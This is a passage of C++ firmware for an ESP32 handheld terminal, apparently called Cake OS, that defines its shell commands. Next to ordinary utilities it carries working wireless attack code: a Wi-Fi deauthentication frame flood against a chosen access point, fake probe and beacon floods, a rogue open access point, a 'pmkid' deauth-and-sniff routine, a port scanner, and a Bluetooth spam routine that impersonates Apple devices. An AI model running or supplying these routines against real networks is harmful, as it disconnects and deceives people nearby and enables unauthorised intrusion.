  if (tAllOutCount < TERM_ALLOUT) { strncpy(tAllOut[tAllOutCount], line, TERM_LINE_W); tAllOut[tAllOutCount][TERM_LINE_W]=0; tAllOutCount++; }
  else { for (int i=0;i<TERM_ALLOUT-1;i++) memcpy(tAllOut[i],tAllOut[i+1],TERM_LINE_W+1); strncpy(tAllOut[TERM_ALLOUT-1],line,TERM_LINE_W); tAllOut[TERM_ALLOUT-1][TERM_LINE_W]=0; }
}
void tClearHist() { tHistCount=0; tAllOutCount=0; for(int i=0;i<TERM_HIST_MAX;i++)tHist[i][0]=0; for(int i=0;i<TERM_ALLOUT;i++)tAllOut[i][0]=0; tInputLen=0; tInput[0]=0; }
void tOutClear() { tOutCount = 0; }
void tOutPush(const char* line) { if (tOutCount<TERM_OUTBUF){strncpy(tOutBuf[tOutCount],line,TERM_LINE_W);tOutBuf[tOutCount][TERM_LINE_W]=0;tOutCount++;} }
void tOutPushf(const char* fmt, ...) { char buf[TERM_LINE_W+1]; va_list ap; va_start(ap,fmt); vsnprintf(buf,sizeof(buf),fmt,ap); va_end(ap); tOutPush(buf); }
void tFlushOut() { for (int i=0;i<tOutCount;i++) tPushLine(tOutBuf[i]); tOutClear(); }
void tDrawOutput() {
  tft.fillRect(0, 8, 160, TERM_LINES * 8, TFT_BLACK);
  int show = (tHistCount < TERM_LINES) ? tHistCount : TERM_LINES; int start = tHistCount - show;
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  for (int i = 0; i < show; i++) tft.drawString(tHist[start+i], 2, 8 + i * 8);
}
void tDrawInputLine() {
  tft.fillRect(0, 32, 160, 11, TFT_NAVY);
  tft.setTextColor(TFT_YELLOW, TFT_NAVY); tft.drawString(">", 1, 33);
  int startIdx=0; if (tInputLen>24) startIdx=tInputLen-24;
  int visLen=tInputLen-startIdx; if (visLen>24) visLen=24;
  if (visLen>0){char vis[25];memcpy(vis,tInput+startIdx,visLen);vis[visLen]=0;tft.drawString(vis,12,33);}
  int cx = 12 + visLen * 6; if (cx > 154) cx = 154;
  if (((millis() / 500) & 1) == 0) tft.fillRect(cx, 33, 6, 8, TFT_YELLOW);
}
void tDrawFull() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Terminal", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:view  R2x:exit", 88, 0);
  tDrawOutput(); tDrawInputLine(); kbDrawFull();
}
void tViewMode() {
  if (tAllOutCount == 0) return;
  int totalPages = (tAllOutCount + TERM_VIEW - 1) / TERM_VIEW; if (totalPages < 1) totalPages = 1;
  int top = (totalPages - 1) * TERM_VIEW;
  while (true) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Output", 2, 0);
    char pos[20]; snprintf(pos, sizeof(pos), "%d/%d", top/TERM_VIEW+1, totalPages); tft.drawString(pos, 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < TERM_VIEW && top + i < tAllOutCount; i++) tft.drawString(tAllOut[top+i], 2, 10 + i * 8);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("click:back", 2, 74);
    char k = 0;
    if (digitalRead(BTN_UP)==LOW){delay(20);while(digitalRead(BTN_UP)==LOW)delay(5);k='U';}
    else if (digitalRead(BTN_DOWN)==LOW){delay(20);while(digitalRead(BTN_DOWN)==LOW)delay(5);k='D';}
    else if (digitalRead(BTN_LEFT)==LOW){delay(20);while(digitalRead(BTN_LEFT)==LOW)delay(5);return;}
    else if (digitalRead(BTN_RIGHT)==LOW){delay(20);while(digitalRead(BTN_RIGHT)==LOW)delay(5);return;}
    if (k == 'U') { if (top > 0) top -= TERM_VIEW; } else if (k == 'D') { if (top + TERM_VIEW < tAllOutCount) top += TERM_VIEW; }
    delay(15);
  }
}
void tCmdHelp() {
  tOutPush("System: help clear ver mem time");
  tOutPush(" info reset echo history gpio");
  tOutPush(" temp cpu heap tasks uptime");
  tOutPush(" resetreason crash nvs");
  tOutPush("File: cat rm write ls df log");
  tOutPush(" clearlog hacklog");
  tOutPush("Misc: md5 rand sleep adc pwm");
  tOutPush(" tone i2c subghz");
  tOutPush("WiFi: wifi scan|ip|status");
  tOutPush(" wifi sniff|probe|beacon|chan");
  tOutPush(" wifi deauth|karma|pmkid");
  tOutPush(" wifi sniffraw|connect|disconnect");
  tOutPush("Net: ping nslookup portscan http");
  tOutPush("BLE: ble scan|track|spam");
  tOutPush("!!  !<n>");
}
void tCmdGpio(const char* a1, const char* a2, const char* a3) {
  if (strcasecmp(a1,"read")==0 && a2[0]) { int pin=atoi(a2); pinMode(pin, INPUT_PULLUP); tOutPushf("GPIO%d = %d", pin, digitalRead(pin)); }
  else if (strcasecmp(a1,"write")==0 && a2[0]) { int pin=atoi(a2); int val=(a3[0])?atoi(a3):1; pinMode(pin, OUTPUT); digitalWrite(pin, val); tOutPushf("GPIO%d = %d", pin, val); }
  else { tOutPush("gpio read <pin>"); tOutPush("gpio write <pin> <0/1>"); }
}
void tCmdI2c(const char* a1) {
  if (strcasecmp(a1,"scan")==0) { Wire.begin(); tOutPush("Scanning I2C..."); int found = 0;
    for (uint8_t a=1;a<128;a++){Wire.beginTransmission(a);if(Wire.endTransmission()==0){tOutPushf("Found 0x%02X",a);found++;if(found>=6){tOutPush("...+more");break;}}}
    if (!found) tOutPush("(none)");
  } else tOutPush("i2c scan");
}
void tCmdLs() { ensureLittleFS(); File root = LittleFS.open("/"); if (!root) { tOutPush("FS fail"); return; }
  File f = root.openNextFile(); int n = 0;
  while (f && n < 10) { char buf[TERM_LINE_W+1]; snprintf(buf,sizeof(buf),"%s %d",f.name(),(int)f.size()); tOutPush(buf); n++; f = root.openNextFile(); }
  if (n == 0) tOutPush("(empty)"); }
void tCmdDf() { ensureLittleFS(); size_t total=LittleFS.totalBytes(); size_t used=LittleFS.usedBytes(); tOutPushf("Total: %u",(unsigned)total); tOutPushf("Used : %u",(unsigned)used); tOutPushf("Free : %u",(unsigned)(total-used)); }
void tCmdCat(const char* a1) {
  if (!a1[0]) { tOutPush("cat <file>"); return; }
  ensureLittleFS();
  File f = LittleFS.open(a1, "r");
  if (!f) { tOutPush("Not found"); return; }
  int lines = 0;
  while (f.available() && lines < 12) { String s = f.readStringUntil('\n'); tOutPush(s.substring(0, TERM_LINE_W).c_str()); lines++; }
  if (f.available()) tOutPush("...more");
  f.close();
}
void tCmdRm(const char* a1) {
  if (!a1[0]) { tOutPush("rm <file>"); return; }
  ensureLittleFS();
  if (LittleFS.exists(a1)) { LittleFS.remove(a1); tOutPush("Removed"); }
  else tOutPush("Not found");
}
void tCmdWrite(const char* a1, const char* a2) {
  if (!a1[0]) { tOutPush("write <file> <text>"); return; }
  ensureLittleFS();
  File f = LittleFS.open(a1, "a");
  if (!f) { tOutPush("Open fail"); return; }
  f.println(a2);
  f.close();
  tOutPush("OK");
}
void tCmdLogInfo() {
  ensureLittleFS();
  size_t sz = 0;
  if (LittleFS.exists(LOG_FILE)) { File f = LittleFS.open(LOG_FILE, "r"); if (f) { sz = f.size(); f.close(); } }
  tOutPushf("Log: %u B", (unsigned)sz);
  tOutPushf("HackLog: %u B", (unsigned)hackLogSize());
}
void tCmdClearLog() { logClear(); tOutPush("Cleared"); }
void tCmdHackLog() {
  ensureLittleFS();
  File f = LittleFS.open(HACKLOG_FILE, "r");
  if (!f) { tOutPush("No hack log"); return; }
  int lines = 0;
  while (f.available() && lines < 12) { String s = f.readStringUntil('\n'); tOutPush(s.substring(0, TERM_LINE_W).c_str()); lines++; }
  if (f.available()) tOutPush("...more");
  f.close();
}
void tCmdMd5(const char* text) {
  if (!text[0]) { tOutPush("md5 <text>"); return; }
  const mbedtls_md_info_t* info = mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
  if (!info) { tOutPush("MD5 N/A"); return; }
  unsigned char digest[16];
  int rc = mbedtls_md(info, (const unsigned char*)text, strlen(text), digest);
  if (rc != 0) { tOutPush("MD5 fail"); return; }
  char hex[33];
  for (int i = 0; i < 16; i++) sprintf(hex + i * 2, "%02x", digest[i]);
  hex[32] = 0;
  tOutPush(hex);
}
void tCmdRand(const char* a1) { long m = a1[0] ? atol(a1) : 100; if (m <= 0) m = 100; tOutPushf("Rand: %ld", random(m)); }
void tCmdSleep(const char* a1) {
  int ms = a1[0] ? atoi(a1) : 500;
  if (ms < 10) ms = 10; if (ms > 5000) ms = 5000;
  tOutPushf("Sleep %dms", ms); delay(ms);
}
void tCmdAdc(const char* a1) {
  int pin = a1[0] ? atoi(a1) : 0;
  pinMode(pin, INPUT);
  int v = analogRead(pin);
  tOutPushf("ADC%d = %d", pin, v);
}
void tCmdPwm(const char* a1, const char* a2, const char* a3) {
  if (!a1[0]||!a2[0]) { tOutPush("pwm <pin> <freq> [duty]"); return; }
  int pin = atoi(a1); int freq = atoi(a2); int duty = a3[0] ? atoi(a3) : 128;
  if (freq < 1) freq = 1000;
  if (duty < 0) duty = 0; if (duty > 255) duty = 255;
  ledcSetup(0, freq, 8);
  ledcAttachPin(pin, 0);
  ledcWrite(0, duty);
  tOutPushf("PWM pin%d %dHz %d", pin, freq, duty);
}
void tCmdTone(const char* a1, const char* a2, const char* a3) {
  if (!a1[0]||!a2[0]) { tOutPush("tone <pin> <freq> [ms]"); return; }
  int pin = atoi(a1); int freq = atoi(a2); int ms = a3[0] ? atoi(a3) : 200;
  if (freq < 100) freq = 100;
  if (ms < 10) ms = 10;
  if (ms > 5000) ms = 5000;
  ledcSetup(1, freq, 8);
  ledcAttachPin(pin, 1);
  ledcWriteTone(1, freq);
  delay(ms);
  ledcWriteTone(1, 0);
  ledcDetachPin(pin);
  tOutPush("Beep done");
}
void tCmdWifiScan() { WiFi.mode(WIFI_OFF); delay(50); WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
  int n = WiFi.scanNetworks(); if (n <= 0) { tOutPush("No AP"); return; } tOutPushf("Found %d APs:", n);
  int show = (n<15)?n:15;
  for (int i=0;i<show;i++){String s=WiFi.SSID(i);s.replace(" ","_");char buf[TERM_LINE_W+1];snprintf(buf,sizeof(buf),"%d %s %d c%d",i,s.substring(0,10).c_str(),WiFi.RSSI(i),WiFi.channel(i));tOutPush(buf);} }
void tCmdWifiIp() { WiFi.mode(WIFI_STA); if (WiFi.status()!=WL_CONNECTED){tOutPush("Not connected");return;} tOutPushf("IP: %s",WiFi.localIP().toString().c_str()); tOutPushf("GW: %s",WiFi.gatewayIP().toString().c_str()); tOutPushf("MAC:%s",WiFi.macAddress().c_str()); }
void tCmdWifiStatus() { WiFi.mode(WIFI_STA); int st = WiFi.status(); const char* n = "?";
  switch (st) { case WL_IDLE_STATUS: n="IDLE";break; case WL_NO_SSID_AVAIL: n="NO_SSID";break; case WL_CONNECTED: n="CONNECTED";break; case WL_CONNECT_FAILED: n="FAILED";break; case WL_DISCONNECTED: n="DISCONNECTED";break; }
  tOutPushf("State: %s", n); if (wifiConfigured) tOutPushf("SSID: %s", g_wifiSSID); }
void tCmdWifiDeauth(const char* arg) { WiFi.mode(WIFI_STA); int n = WiFi.scanNetworks(); if (n<=0){tOutPush("No AP");return;}
  int idx=(arg&&*arg)?atoi(arg):0; if (idx<0||idx>=n){tOutPush("Bad index");return;}
  uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(idx), 6); uint8_t ch = WiFi.channel(idx); String ssid = WiFi.SSID(idx);
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start(); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t d[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
  memcpy(d+10,bssid,6); memcpy(d+16,bssid,6);
  tOutPushf("Firing 100 to %.12s", ssid.c_str());
  for (int i=0;i<100;i++) { esp_wifi_80211_tx(WIFI_IF_STA,d,sizeof(d),false); delay(2); }
  esp_wifi_stop(); esp_wifi_deinit(); tOutPush("Deauth done"); }
void tCmdWifiProbe() { WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start();
  const char* fakes[] = {"FreeWiFi","TP-LINK","CMCC","iPhone","Starbucks","Hotel","Airport"};
  for (int i=0;i<100;i++) { uint8_t f[64]={0x40,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0}; for(int j=10;j<16;j++)f[j]=random(256); const char* s=fakes[random(7)]; size_t len=strlen(s); f[24]=0x00;f[25]=len;memcpy(&f[26],s,len); esp_wifi_80211_tx(WIFI_IF_STA,f,26+len,false); delay(2); }
  esp_wifi_stop(); esp_wifi_deinit(); tOutPush("Probe 100 done"); }
void tCmdWifiBeacon() { WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP); esp_wifi_start(); esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
  const char* names[]={"FreeWiFi","CMCC","ChinaNet","Starbucks","Airport","TP-LINK","HUAWEI","Xiaomi","iPhone"};
  for (int i=0;i<50;i++){uint8_t b[96]={0x80,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x64,0,0x31,0x04,0,0};for(int j=0;j<6;j++){uint8_t m=random(256);b[10+j]=m;b[16+j]=m;}const char* s=names[random(9)];size_t len=strlen(s);b[37]=len;memcpy(&b[38],s,len);esp_wifi_80211_tx(WIFI_IF_AP,b,38+len,false);delay(3);}
  esp_wifi_stop(); esp_wifi_deinit(); tOutPush("Beacon 50 done"); }
void tCmdWifiChan() { WiFi.mode(WIFI_STA); int n = WiFi.scanNetworks(); if (n<=0){tOutPush("No AP");return;}
  int ch[14]={0}; for(int i=0;i<n;i++){int c=WiFi.channel(i);if(c>=1&&c<=13)ch[c]++;}
  tOutPush("Channel map:");
  for (int c=1;c<=13;c++){char bar[20];int b=ch[c];if(b>14)b=14;for(int i=0;i<b;i++)bar[i]='#';bar[b]=0;tOutPushf("%2d %-14s %d",c,bar,ch[c]);} }
void tCmdWifiSniff(const char* arg) { int dur=(arg&&*arg)?atoi(arg):10; if (dur<3)dur=3; if (dur>30)dur=30;
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start();
  static struct { uint8_t mac[6]; char ssid[24]; int rssi; } hits[20]; static int hitCount=0; hitCount=0;
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
    if (type != WIFI_PKT_MGMT) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* p = pkt->payload; int len = pkt->rx_ctrl.sig_len; if (len<24) return;
    uint8_t fc=p[0]; if (((fc>>2)&3)!=0) return; if (((fc>>4)&0xF)!=4) return;
    int i=24; char ss[25]={0};
    while (i+1<len){uint8_t tag=p[i],tl=p[i+1];if(i+2+tl>len)break;if(tag==0&&tl>0&&tl<=24){memcpy(ss,&p[i+2],tl);ss[tl]=0;break;}i+=2+tl;}
    if (!ss[0]) return;
    for (int k=0;k<hitCount;k++) if (memcmp(hits[k].mac,&p[10],6)==0) return;
    if (hitCount<20){memcpy(hits[hitCount].mac,&p[10],6);strncpy(hits[hitCount].ssid,ss,24);hits[hitCount].rssi=pkt->rx_ctrl.rssi;hitCount++;}
  });
  esp_wifi_set_promiscuous(true);
  unsigned long start = millis(); while (millis()-start < (unsigned long)dur*1000) delay(50);
  esp_wifi_set_promiscuous(false); esp_wifi_stop(); esp_wifi_deinit();
  tOutPushf("Found %d SSIDs:", hitCount);
  for (int i=0;i<hitCount && i<15;i++) tOutPushf("%s %d", hits[i].ssid, hits[i].rssi); }
void tCmdWifiKarma(const char* arg) { const char* ssid = (arg && *arg) ? arg : "FreeWiFi";
  WiFi.mode(WIFI_AP); delay(100);
  if (!WiFi.softAP(ssid, NULL)) { tOutPush("AP start fail"); return; }
  tOutPushf("AP: %s", ssid); tOutPushf("IP:%s", WiFi.softAPIP().toString().c_str());
  delay(5000); int c = WiFi.softAPgetStationNum();
  tOutPush("AP closed"); tOutPushf("Clients: %d", c); WiFi.softAPdisconnect(true); }
void tCmdWifiPmkid(const char* arg) { WiFi.mode(WIFI_STA); int n = WiFi.scanNetworks(); if (n<=0){tOutPush("No AP");return;}
  int idx=(arg&&*arg)?atoi(arg):0; if (idx<0||idx>=n){tOutPush("Bad index");return;}
  uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(idx), 6); uint8_t ch = WiFi.channel(idx);
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start(); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  static int pktCount=0; pktCount=0;
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){if(type)pktCount++;});
  esp_wifi_set_promiscuous(true);
  uint8_t d[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
  memcpy(d+10,bssid,6); memcpy(d+16,bssid,6);
  unsigned long start=millis();
  while (millis()-start<8000){for(int i=0;i<5;i++)esp_wifi_80211_tx(WIFI_IF_STA,d,sizeof(d),false);delay(100);}
  esp_wifi_set_promiscuous(false); esp_wifi_stop(); esp_wifi_deinit();
  tOutPush("PMKID done"); tOutPushf("Frames: %d", pktCount); }
void tCmdWifiSniffRaw(const char* arg) { int dur = (arg && *arg) ? atoi(arg) : 5; if (dur<2) dur=2; if (dur>20) dur=20;
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start();
  Serial.println("=== RAW DUMP START ===");
  static int cnt; cnt=0;
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf; int len = pkt->rx_ctrl.sig_len; if (len<10) return;
    Serial.printf("[%d] ch=%d rssi=%d len=%d: ", cnt, pkt->rx_ctrl.channel, pkt->rx_ctrl.rssi, len);
    for (int i=0;i<len && i<32;i++) Serial.printf("%02X", pkt->payload[i]);
    Serial.println(); cnt++; });
  esp_wifi_set_promiscuous(true); delay((unsigned long)dur*1000); esp_wifi_set_promiscuous(false); esp_wifi_stop(); esp_wifi_deinit();
  Serial.println("=== RAW DUMP END ==="); tOutPushf("Done: %d pkts", cnt); }
void tCmdWifiConnect(const char* a1, const char* a2) { if (!a1[0]) { tOutPush("wifi connect <ssid>"); tOutPush("<pass>"); return; }
  WiFi.mode(WIFI_OFF); delay(100); WiFi.persistent(false);
  WiFi.mode(WIFI_STA); WiFi.setSleep(false); esp_wifi_set_ps(WIFI_PS_NONE); WiFi.begin(a1, a2);
  unsigned long start=millis();
  while (millis()-start<10000){if(WiFi.status()==WL_CONNECTED){tOutPush("Connected");tOutPushf("IP: %s",WiFi.localIP().toString().c_str());return;}delay(200);}
  tOutPush("Failed"); }
void tCmdWifiDisconnect() { WiFi.disconnect(true); wifiConfigured=false; g_wifiSSID[0]=0; g_wifiPass[0]=0; WifiCred wc; wc.magic=0; EEPROM.put(WC_EEPROM_ADDR, wc); EEPROM.commit(); wifiIpCacheClear(); tOutPush("Disconnected"); }
void tCmdPing(const char* host) { if (!host[0]) { tOutPush("Usage: ping <host>"); return; }
  WiFi.mode(WIFI_STA); if (WiFi.status()!=WL_CONNECTED){tOutPush("No WiFi");return;}
  IPAddress ip; if (!WiFi.hostByName(host,ip)){tOutPush("DNS fail");return;}
  tOutPushf("Ping %s", ip.toString().c_str());
  WiFiClient client; int ok=0; unsigned long total=0;
  for (int i=0;i<4;i++){client.stop();unsigned long t0=millis();bool c=client.connect(ip,80,800);unsigned long dt=millis()-t0;if(c){ok++;total+=dt;tOutPushf(" #%d: %lu ms",i+1,dt);}else tOutPushf(" #%d: timeout",i+1);client.stop();delay(150);}
  tOutPushf("%d/4 avg %lu", ok, ok?total/ok:0); }
void tCmdNslookup(const char* host) { if (!host[0]) { tOutPush("Usage: nslookup <host>"); return; }
  WiFi.mode(WIFI_STA); if (WiFi.status()!=WL_CONNECTED){tOutPush("No WiFi");return;}
  IPAddress ip; if (WiFi.hostByName(host,ip)){tOutPushf("Host: %s",host);tOutPushf("IP  : %s",ip.toString().c_str());} else tOutPush("DNS fail"); }
void tCmdPortscan(const char* host) { if (!host[0]) { tOutPush("Usage: portscan <host>"); return; }
  WiFi.mode(WIFI_STA); if (WiFi.status()!=WL_CONNECTED){tOutPush("No WiFi");return;}
  IPAddress ip; if (!WiFi.hostByName(host,ip)){tOutPush("DNS fail");return;}
  const uint16_t ports[] = {21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443};
  tOutPushf("Scan %s", ip.toString().c_str());
  WiFiClient client; int openCount = 0;
  for (int i=0;i<14;i++){client.stop();if(client.connect(ip,ports[i],250)){tOutPushf(" %5u OPEN",ports[i]);openCount++;}client.stop();}
  tOutPushf("Open: %d", openCount); }
void tCmdHttp(const char* url) { if (!url[0]) { tOutPush("Usage: http <host>"); return; }
  WiFi.mode(WIFI_STA); if (WiFi.status()!=WL_CONNECTED){tOutPush("No WiFi");return;}
  char host[64]; const char* p = url; const char* slash = strchr(p, '/'); const char* colon = strchr(p, ':');
  int hl; int port = 80;
  if (colon && (!slash || colon < slash)) { hl = colon-p; port = atoi(colon+1); } else if (slash) hl = slash-p; else hl = strlen(p);
  if (hl>63) hl=63; memcpy(host, p, hl); host[hl]=0;
  const char* path = slash ? slash : "/";
  IPAddress ip; if (!WiFi.hostByName(host,ip)){tOutPush("DNS fail");return;}
  WiFiClient client; tOutPushf("GET %s", host);
  if (!client.connect(ip,port,2000)){tOutPush("Connect fail");return;}
  client.printf("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: CakeTerm\r\n\r\n", path, host);
  unsigned long t0=millis(); int total=0;
  while (client.connected() && (millis()-t0)<3000){while(client.available()){client.read();total++;}delay(1);}
  client.stop(); tOutPushf("Bytes: %d", total); tOutPushf("Time : %lu ms", millis()-t0); }
void tCmdBleScan() { deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  NimBLEDevice::init("CakeTerm");
  static struct { char name[20]; int rssi; } devs[10]; static int devCount=0; devCount=0;
  class CB : public NimBLEScanCallbacks { void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (devCount>=10) return; String n = dev->haveName()?dev->getName().c_str():"?";
    for (int i=0;i<devCount;i++) if (strncmp(devs[i].name,n.c_str(),19)==0){devs[i].rssi=dev->getRSSI();return;}
    strncpy(devs[devCount].name,n.c_str(),19);devs[devCount].name[19]=0;devs[devCount].rssi=dev->getRSSI();devCount++;
  }};
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new CB(), false); pScan->setActiveScan(true);
  pScan->start(5); pScan->stop(); NimBLEDevice::deinit(false);
  tOutPushf("BLE: %d devices", devCount);
  for (int i=0;i<devCount && i<12;i++) tOutPushf("%s %d", devs[i].name, devs[i].rssi); }
void tCmdBleTrack() { deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  NimBLEDevice::init("CakeTerm");
  static struct { char mac[18]; int rssi; } trks[8]; static int trkCount=0; trkCount=0;
  class CB : public NimBLEScanCallbacks { void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (trkCount>=8) return; if (!dev->haveManufacturerData()) return;
    std::string mfg = dev->getManufacturerData(); if (mfg.length()<4) return;
    if ((uint8_t)mfg[0]==0x4C && (uint8_t)mfg[1]==0x00 && (uint8_t)mfg[2]==0x12 && (uint8_t)mfg[3]==0x19) {
      String mac = dev->getAddress().toString().c_str();
      strncpy(trks[trkCount].mac,mac.c_str(),17);trks[trkCount].mac[17]=0;trks[trkCount].rssi=dev->getRSSI();trkCount++;
    } }};
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new CB(), false); pScan->setActiveScan(true);
  pScan->start(6); pScan->stop(); NimBLEDevice::deinit(false);
  tOutPushf("Trackers: %d", trkCount);
  for (int i=0;i<trkCount;i++) tOutPushf("%s %d", trks[i].mac, trks[i].rssi); }
void tCmdBleSpam(const char* arg) { int dur = (arg && *arg) ? atoi(arg) : 10; if (dur<2) dur=2; if (dur>20) dur=20;
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  NimBLEDevice::init("CakeTerm");
  NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
  unsigned long start=millis(); int cnt=0;
  const char* fakeNames[] = {"AirPods","AppleTV","AirPlay","Handoff","Nearby"};
  while (millis()-start < (unsigned long)dur*1000) {
    NimBLEAdvertisementData adv; adv.setName(fakeNames[cnt%5]);
    uint8_t mfg[8] = {0x4C,0x00,0x07,0x19,0x01,0x02,0x03,0x04}; mfg[4]=random(256);
    adv.setManufacturerData(std::string((const char*)mfg,8));
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(80); pAdv->stop(); cnt++; }
  NimBLEDevice::deinit(false); tOutPushf("BLE spam: %d", cnt); }

bool tExecLocal() {
  if (tInputLen == 0) return true;
  if (tCmdHistCount<8){strncpy(tCmdHist[tCmdHistCount],tInput,TERM_BUF_MAX);tCmdHist[tCmdHistCount][TERM_BUF_MAX]=0;tCmdHistCount++;}
  else {for(int i=0;i<7;i++)memcpy(tCmdHist[i],tCmdHist[i+1],TERM_BUF_MAX+1);strncpy(tCmdHist[7],tInput,TERM_BUF_MAX);tCmdHist[7][TERM_BUF_MAX]=0;}
  char echo[TERM_LINE_W+3]; echo[0]='>';echo[1]=' ';
  int n=(tInputLen<TERM_LINE_W)?tInputLen:TERM_LINE_W; memcpy(echo+2,tInput,n);echo[2+n]=0; tPushLine(echo);
  char cmd[16]={0}, a1[64]={0}, a2[64]={0}, a3[64]={0};
  const char* p = tInput; int ci=0;
  while (*p && *p!=' ' && ci<15) cmd[ci++]=*p++; cmd[ci]=0;
  while (*p==' ')p++; ci=0; while (*p && *p!=' ' && ci<63) a1[ci++]=*p++; a1[ci]=0;
  while (*p==' ')p++; ci=0; while (*p && *p!=' ' && ci<63) a2[ci++]=*p++; a2[ci]=0;
  while (*p==' ')p++; ci=0; while (*p && ci<63) a3[ci++]=*p++; a3[ci]=0;
  tOutClear();
  if (strcasecmp(cmd,"help")==0){tCmdHelp();tFlushOut();return true;}
  if (strcasecmp(cmd,"clear")==0){tHistCount=0;tAllOutCount=0;for(int i=0;i<TERM_HIST_MAX;i++)tHist[i][0]=0;for(int i=0;i<TERM_ALLOUT;i++)tAllOut[i][0]=0;return true;}
  if (strcasecmp(cmd,"ver")==0){tOutPush("Terminal v5");tOutPush("Cake OS 5.3");tOutPush(__DATE__);tFlushOut();return true;}
  if (strcasecmp(cmd,"mem")==0){tOutPushf("Free: %u",(unsigned)ESP.getFreeHeap());tOutPushf("Min : %u",(unsigned)ESP.getMinFreeHeap());tOutPushf("Size: %u",(unsigned)ESP.getHeapSize());tFlushOut();return true;}
  if (strcasecmp(cmd,"time")==0){tOutPushf("Up: %lu s",millis()/1000);tOutPushf("Min: %lu",millis()/60000);tFlushOut();return true;}
  if (strcasecmp(cmd,"uptime")==0){tOutPushf("ms: %lu",millis());tFlushOut();return true;}
  if (strcasecmp(cmd,"info")==0){tOutPushf("Chip: %s",ESP.getChipModel());tOutPushf("Rev : %d",ESP.getChipRevision());tOutPushf("CPU : %u MHz",(unsigned)getCpuFrequencyMhz());tFlushOut();return true;}
  if (strcasecmp(cmd,"cpu")==0){if(a1[0]){int mhz=atoi(a1);if(mhz==80||mhz==160||mhz==240){setCpuFrequencyMhz(mhz);tOutPushf("CPU = %d MHz",mhz);}else tOutPush("80/160/240");}else tOutPushf("CPU = %u MHz",(unsigned)getCpuFrequencyMhz());tFlushOut();return true;}
  if (strcasecmp(cmd,"heap")==0){tOutPushf("Free: %u",(unsigned)ESP.getFreeHeap());tOutPushf("MaxBlk:%u",(unsigned)ESP.getMaxAllocHeap());tOutPushf("Min : %u",(unsigned)ESP.getMinFreeHeap());tFlushOut();return true;}
  if (strcasecmp(cmd,"reset")==0){tOutPush("Rebooting...");tFlushOut();tDrawOutput();delay(600);ESP.restart();return true;}
  if (strcasecmp(cmd,"resetreason")==0){tOutPushf("Reason: %d",(int)esp_reset_reason());tFlushOut();return true;}
